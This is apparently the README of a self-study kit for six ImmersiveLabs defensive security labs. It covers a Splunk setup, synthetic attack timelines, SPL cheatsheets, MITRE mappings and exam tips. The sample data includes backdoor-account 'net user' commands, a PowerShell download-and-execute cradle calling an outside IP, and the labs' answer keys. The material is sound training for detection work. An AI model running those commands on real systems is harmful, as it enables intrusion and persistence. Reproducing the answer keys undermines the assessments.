# ImmersiveLabs Exam Prep

A self-study kit for 6 cybersecurity labs. Each lab has theory notes, ready-to-run queries, and a local Splunk environment for hands-on practice.

---

## Quick Start

```bash
# 1. Generate sample data
cd docker/scripts
python3 generate_sample_data.py

# 2. Start Splunk
cd ..
docker-compose up -d

# 3. Wait ~60s then open
# http://localhost:8000   admin / AABVINLABS1!
```

---

## Labs

| # | Lab | Folder | Tools |
|---|-----|--------|-------|
| 1 | Incident Response: Clipboard Data Theft | `labs/01-clipboard-theft/` | Splunk, Volatility, PowerShell |
| 2 | Splunk: Malicious Account Creation | `labs/02-splunk-account-creation/` | Splunk SPL |
| 3 | FIN7 Threat Hunting with Splunk | `labs/03-fin7-threat-hunting/` | Splunk SPL, MITRE ATT&CK |
| 4 | Packet Analysis: Demonstrate Your Skills | `labs/04-packet-analysis/` | Wireshark, tshark |
| 5 | Malicious OneNote Analysis | `labs/05-onenote-analysis/` | olentools, strings, Splunk |
| 6 | Incident Response: Suspicious Email | `labs/06-suspicious-email/` | Email headers, Splunk, Wireshark |

Each lab folder contains:
- `notes.md` — theory, TTPs, artifacts, MITRE ATT&CK mapping
- `queries.md` — copy-paste ready SPL queries, CLI commands, filters

---

## Learning Path

Work through labs in this order for best knowledge build-up:

```
Lab 2  →  Lab 3  →  Lab 1  →  Lab 6  →  Lab 5  →  Lab 4
(Foundation)     (IR Skills)          (Specialist)
```

### Why this order?
- **Labs 2 & 3** — Build Splunk fundamentals. Account creation + FIN7 hunting covers the most common event IDs used across all labs.
- **Lab 1** — Clipboard theft is a subset of the process-level hunting you learn in Lab 3.
- **Lab 6** — Suspicious email IR ties together everything: email analysis + process chains + network IOCs.
- **Lab 5** — OneNote malware is a delivery method variant, easier after understanding execution chains.
- **Lab 4** — Packet analysis is standalone but benefits from understanding the attack patterns from prior labs.

---

## Splunk Lab Environment

### What's inside the data

#### Index: `lab02` — Malicious Account Creation
```
Attack timeline (2024-11-14 02:17 UTC — outside business hours):

02:17:00  EventCode=4624  j.smith logs in via RDP from 185.220.101.47
02:17:45  EventCode=4688  net.exe → "net user svc_backup P@ssw0rd123! /add"
02:17:46  EventCode=4720  Account svc_backup CREATED by j.smith
02:17:47  EventCode=4722  Account svc_backup ENABLED
02:17:55  EventCode=4688  net.exe → "net localgroup Administrators svc_backup /add"
02:17:56  EventCode=4732  svc_backup ADDED to Administrators
02:19:00  EventCode=4624  svc_backup logs in from 185.220.101.47
02:22:00  EventCode=1102  Audit log CLEARED by svc_backup
```

**Key answers:**
- Attacker IP: `185.220.101.47`
- Malicious account: `svc_backup`
- Created by: `j.smith`
- Group: `Administrators`
- Cleanup: log cleared (EventCode 1102)

#### Index: `lab03` — FIN7 Threat Hunting
```
Attack timeline (2024-11-14 02:17 UTC):

02:17:00  Sysmon 1   WINWORD.EXE opens Q4_Invoice_11142024.doc (macro triggers)
02:19:00  Sysmon 1   WINWORD.EXE → cmd.exe → powershell -nop -w hidden -enc [base64]
02:19:01  Sysmon 1   powershell.exe executes encoded command
02:19:02  Sysmon 3   powershell.exe connects to 185.220.101.47:8080 (C2)
02:19:05  Sysmon 11  update.exe dropped to %APPDATA%\Local\Temp\
02:19:10  Sysmon 1   update.exe executes
02:19:15  Sysmon 3   update.exe beacons to 185.220.101.47:443 (every ~60s)
02:19:20  Sysmon 13  Registry Run key set for persistence
02:22:55  Sysmon 1   schtasks.exe creates scheduled task LpkInstall
02:23:00  Event 4698  Scheduled task LpkInstall created
02:26:40  Sysmon 10  update.exe accesses lsass.exe (credential theft)
02:27:00  Event 4648  Explicit creds used → lateral move to CORP-DC01
02:27:20  Event 4624  RDP logon to CORP-DC01 (LogonType=10)
02:27:50  Event 4720  fin7_persist account created on DC
02:27:51  Event 4732  fin7_persist added to Administrators
```

**Encoded PowerShell decodes to:**
```powershell
$c=New-Object System.Net.WebClient;$c.DownloadString('http://185.220.101.47/gate')|IEX
```

**Key answers:**
- Initial file: `Q4_Invoice_11142024.doc`
- C2 IP: `185.220.101.47`
- Payload dropped: `C:\Users\m.johnson\AppData\Local\Temp\update.exe`
- Persistence: Registry Run key + Scheduled Task `LpkInstall`
- Credential theft: LSASS access (GrantedAccess: 0x1010)
- Lateral movement target: `CORP-DC01`
- Persistence account: `fin7_persist`

---

## Splunk Search Cheatsheet

### Basics
```spl
index=lab02                         -- search lab02
index=lab03                         -- search lab03
index=lab02 OR index=lab03          -- search both

| stats count by EventCode          -- count events by type
| table _time, field1, field2       -- display as table
| sort _time                        -- sort by time ascending
| sort -count                       -- sort by count descending
| head 20                           -- limit to first 20 results
```

### Extract fields from JSON events
```spl
index=lab02 EventCode | where EventCode=4720
index=lab03 EventID  | where EventID=1
```

### Time range (set in UI or via SPL)
```spl
index=lab02 earliest=-24h latest=now
index=lab02 earliest="2024-11-14T02:00:00" latest="2024-11-14T03:00:00"
```

### Most useful event codes to know
```
Security Log:
  4624  Logon success       4625  Logon failure
  4648  Explicit creds      4688  Process created
  4698  Scheduled task      4720  Account created
  4726  Account deleted     4732  Added to local group
  1102  Log cleared

Sysmon:
  1   Process create        3   Network connection
  7   Image loaded (DLL)    10  Process access (LSASS)
  11  File created          13  Registry modified
  22  DNS query
```

---

## Key Concepts Per Lab

### Lab 1 — Clipboard Data Theft
- **What:** Malware reads clipboard via WinAPI (`OpenClipboard`, `GetClipboardData`) or PowerShell `Get-Clipboard`
- **MITRE:** T1115
- **Hunt:** Process accessing clipboard from `%TEMP%` / `%APPDATA%`, small periodic outbound connections
- **Malware examples:** Dridex, TrickBot, Azorult, Clipbanker (swaps crypto addresses)

### Lab 2 — Malicious Account Creation
- **What:** Attacker creates backdoor local/domain account for persistent access
- **MITRE:** T1136.001, T1098
- **Key events:** 4720 (created) → 4732 (added to group) → 4624 (used)
- **Red flags:** Created outside business hours, immediately added to Admins, created from non-DC host

### Lab 3 — FIN7 Threat Hunting
- **Who:** FIN7 (Carbanak group) — financially motivated, targets retail/hospitality
- **Entry:** Spearphishing with macro-enabled documents
- **Tools:** Carbanak RAT, BABYMETAL, BOOSTWRITE, DICELOADER
- **Hunt chain:** WINWORD → cmd → PowerShell -enc → download → execute → persist → LSASS → lateral move

### Lab 4 — Packet Analysis
- **Tools:** Wireshark (GUI), tshark (CLI)
- **Protocol focus:** HTTP (creds/exfil), DNS (tunneling), FTP (cleartext creds), ICMP (tunneling), SMB (lateral move)
- **Key skills:** Follow TCP stream, export HTTP objects, identify beaconing, decode credentials

### Lab 5 — Malicious OneNote
- **What:** `.one` file embeds HTA/VBS/PS1/EXE; victim clicks → payload runs
- **MITRE:** T1566.001, T1204.002
- **Analysis:** `oleobj`, `strings`, look for ONENOTE.EXE → mshta/wscript/powershell spawn
- **Obfuscation:** Base64 encoded commands, string concatenation, char code arrays

### Lab 6 — Suspicious Email IR
- **Phases:** Email header analysis → attachment analysis → host artifacts → network artifacts → timeline
- **Header checks:** SPF/DKIM/DMARC fail, Reply-To mismatch, X-Originating-IP
- **Host artifacts:** Prefetch, LNK files, Outlook temp folder, PowerShell history, Event 4104 (script block logging)
- **Timeline:** Email received → attachment opened → process spawned → C2 → persistence → lateral move → exfil

---

## MITRE ATT&CK Quick Reference

| Tactic | Key Techniques in These Labs |
|--------|------------------------------|
| Initial Access | T1566.001 Spearphishing Attachment, T1566.002 Spearphishing Link |
| Execution | T1059.001 PowerShell, T1059.003 CMD, T1204.002 User Execution, T1218.005 MSHTA |
| Persistence | T1547.001 Registry Run Keys, T1053.005 Scheduled Task, T1136 Create Account |
| Privilege Escalation | T1548.002 UAC Bypass, T1134 Token Manipulation |
| Defense Evasion | T1027 Obfuscation, T1036 Masquerading, T1070 Indicator Removal, T1197 BITS |
| Credential Access | T1003.001 LSASS Dump, T1056.001 Keylogging, T1115 Clipboard Data |
| Discovery | T1087 Account Discovery, T1082 System Info |
| Lateral Movement | T1021.001 RDP, T1021.006 WinRM, T1550.002 Pass-the-Hash |
| Collection | T1115 Clipboard, T1113 Screen Capture, T1056 Input Capture |
| Exfiltration | T1041 Exfil over C2, T1048 Exfil over Alt Protocol |

---

## Tools Reference

| Tool | Use Case | Command |
|------|----------|---------|
| Splunk | SIEM / log analysis | `http://localhost:8000` |
| Wireshark | PCAP GUI analysis | `wireshark capture.pcap` |
| tshark | PCAP CLI analysis | `tshark -r capture.pcap -Y "http"` |
| olevba | Extract macros from Office/OLE | `olevba malicious.one` |
| oleobj | Extract embedded objects | `oleobj malicious.one` |
| strings | Find readable text in binary | `strings malware.exe` |
| Volatility | Memory forensics | `vol.py -f mem.dmp pslist` |
| CyberChef | Decode/transform data | Browser-based |
| VirusTotal | File/URL reputation | Browser-based |

---

## Exam Tips

1. **Read the question carefully** — note exact field names asked (EventCode vs EventID, SubjectUserName vs TargetUserName)
2. **Set time range to All Time** in Splunk before searching
3. **Start broad** (`index=* | stats count by EventCode`) then narrow
4. **Follow the process chain** — parent → child → network → file → registry
5. **Note exact timestamps** — exams often ask "at what time"
6. **MITRE IDs matter** — know T-numbers for common techniques
7. **SPF FAIL + DMARC FAIL** = strong phishing indicator
8. **LogonType 10** = RDP, **LogonType 3** = network (lateral movement)
9. **GrantedAccess 0x1010 / 0x1410 on lsass.exe** = credential theft
10. **Encoded PowerShell** → always decode with `[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("..."))`
